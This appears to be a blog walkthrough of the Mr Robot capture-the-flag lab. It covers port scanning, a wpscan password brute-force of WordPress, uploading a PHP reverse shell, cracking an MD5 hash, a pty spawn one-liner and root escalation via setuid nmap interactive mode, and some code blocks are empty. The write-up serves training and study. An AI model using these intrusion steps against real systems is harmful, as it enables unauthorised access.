Today's target was inspired by the Mr Robot series. The goal is to find 3 hidden flags.

<!-- more -->

I used Masscan to grab the open ports, which I then passed to Nmap:

``` 
masscan -p1-65535 --banners 192.168.217.145 --rate=10000

Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-07-01 08:49:44 GMT

```

Just a web server. However, this doesn't look like your regular web app:

{% img center /images/pentest/mr-robot/fsociety.png 'fsociety' 'fsociety login' %}

Interesting, we are in contact with fsociety! I ran each command (type help to see them listed at any time), and here's what we have so far:

* prepare - a video that ends with an address that warrants checking: whoismrrobot.com

* fsociety - a CLI animation that asks if you are ready to join

* inform - a series of news that reveal the hypocrisy of today's (is it really made up?) society

{% img center /images/pentest/mr-robot/deflated.png 'sports scandal' 'sports scandal' %}

{% img center /images/pentest/mr-robot/space.png 'space rocket' 'space rocket' %}

{% img center /images/pentest/mr-robot/meast.png 'middle east' 'middle east' %}

{% img center /images/pentest/mr-robot/gala.png 'gala' 'celebrity gala' %}

* question - more pictures with hard to accept truths

{% img center /images/pentest/mr-robot/america.png 'patriot' 'american dream' %}

{% img center /images/pentest/mr-robot/executive.png 'executive' 'executive stealing' %}

{% img center /images/pentest/mr-robot/capitalist.png 'capitalism' 'capitalism' %}

{% img center /images/pentest/mr-robot/bzns.png 'business' 'business' %}

* wakeup - shows some high level executives arguing in a skyscraper

* join - fsociety requests your mail address to keep in touch

{% img center /images/pentest/mr-robot/mail.png 'enter your mail' 'enter your mail' %}

Alright, we had some fun. Now I checked that URL I mentioned earlier for more breadcrumbs:

{% img center /images/pentest/mr-robot/whois.png 'whois mr robot' 'whois mr robot' %}

You can click on the GUI, look around, play some games. There are also some commands you can run in the terminal:

* fsociety_endgame - launches a game that you might want to discover for yourself

* massacre - launches a movie, but I got a message that content is not available to my location

* elliot - shows a GIF

* fivenine - looks like a collection of clips related to the Five-Nine attack

* restart - another scene from the series

* join - get in touch with Mr Robot

* archive - shows some of the above commands

## Flag #1

When running the commands, you probably noticed that the web path changes to <code>URL/cmdname</code>. I looked for robots.txt, and it looks like Mr Robot isn't the only robot around:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

We've found the first flag: <code>073403c8a58a1f80d943455fb30724b9</code>

The other things looks like a dictionary file with various strings. Maybe it will come in handy later.

Continuing the web recon, I decided to use a tool that I haven't used before: uniscan!

### uniscan description

Homepage: https://sourceforge.net/projects/uniscan/

> Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.

This tool comes in both CLI and GUI form. The GUI interface is plain and simple:

{% img center /images/pentest/mr-robot/uniscan-gui.png 'uniscan-gui' 'uniscan gui' %}

```

I ran the CLI tool against the target with most of the flags. While described as simple, it checks for plenty of things: Drupal plugins, mobile versions, error message information, interesting HTML strings, performs whois and nslookup lookups, attempts banner grabbing, runs ping, traceroute and Nmap against the target, looks for some specific issues, and more:

```

And the tool did find some useful information for further compromising the target!

First, I updated the wpscan databse with <code>wpscan --update</code>. Then I performed some enumeration on the target:

```

```

I couldn't use wpscan's findings for exploitation. Based on our earlier finding of a dictionary file, the next step seems to involve bruteforcing. I went back to the file and looked at its size:

``` 
wc -l fsocity.dic 
858160 fsocity.dic
```

Not a small one, but maybe it contains duplicates:

``` 
sort fsocity.dic | uniq | wc -l
11451
```

A little over 11k, much more promising! I created a new file without the duplicates: <code>sort fsocity.dic | uniq > fsociety.txt</code>.

The next step was to visit http://192.168.217.145/wp-login.php and try to gather more information. Bogus login attempts triggered the message: ERROR: Invalid username. Next, I looked in the source to see how form parameters look like:

{% img center /images/pentest/mr-robot/wplogin.png 'wplogin' 'wplogin' %}

It seemed I would have to bruteforce for both username and password, but I tried a few character names from the series first, and that's how I found that elliot is a valid user. With this, I used wpscan to perform the bruteforce attack for the password:

``` 
wpscan --url http://192.168.217.145/ --wordlist ~/Downloads/fsociety.txt --username elliot
[...]
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                                                  

  Brute Forcing 'elliot' Time: 00:02:27 <==================================                                    > (5640 / 11452) 49.24%  ETA: 00:02:32
  +----+--------+------+-----------+

  +----+--------+------+-----------+
  |    | elliot |      | ER28-0652 |
  +----+--------+------+-----------+
```

Excellent, wpscan found the password is *ER28-0652*! I logged in and noticed that all the plugins are outdated:

{% img center /images/pentest/mr-robot/plugins.png 'wp plugins' 'wp plugins' %}

I tried uploading a PHP reverse shell as plugin, but got an error that it couldn't install it. I looked in other places where I could upload it, and when browsing the Media tab, I noticed my shell was there :O

{% img center /images/pentest/mr-robot/media.png 'media library' 'media library' %}

Wasn't sure where it placed in, so I just tried adding shell.php to the URL, and Wordpress kindly gave me the correct path to it, which was http://192.168.217.145/wp-content/uploads/2017/07/shell.php

## Flag #2

Finally achieved presence on the machine:

``` 
$ whoami
daemon
$ ls /home
robot
$ ls -la /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

Found the second flag, but couldn't read it. However, that md5 file was readable:

``` 
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

I cracked the MD5 hash to reveal the password *abcdefghijklmnopqrstuvwxyz* for the user robot. I tried switching to that user, but I got the following error:

``` 
$ su robot
su: must be run from a terminal
```

The error appears because the shell isn't interactive. But I ran into this before, and again [pentestmonkey's oneliners](http://pentestmonkey.net/blog/post-exploitation-without-a-tty) came to the rescue:

``` 
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$ 
```

I grabbed the second flag, and noticed that my commands are now echoed in the terminal and it's annoying:

``` 
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```


## Flag #3

I couldn't find a workaround for that, so I just continued. When I looked for SUID binaries, I found a surprise:

``` 
robot@linux:/$ find / -type f \( -perm +4000 -o -perm +2000 \) -print 2> /dev/null
[...]
/usr/local/bin/nmap
```

After Googling, there even seems to be a [setuid Nmap exploit](https://www.rapid7.com/db/modules/exploit/unix/local/setuid_nmap) in Metasploit! I read more about this problem, and found an interesting [SANS paper](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744) (the Nmap stuff begins on page 11). After some reading, I found that older versions of Nmap had an interactive mode, where you could run shell commands from or drop into a shell (similar to mysql):

``` 
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 
```

The Nmap version is 3.81, so I tried it out:

``` 
nmap> !whoami
!whoami
root
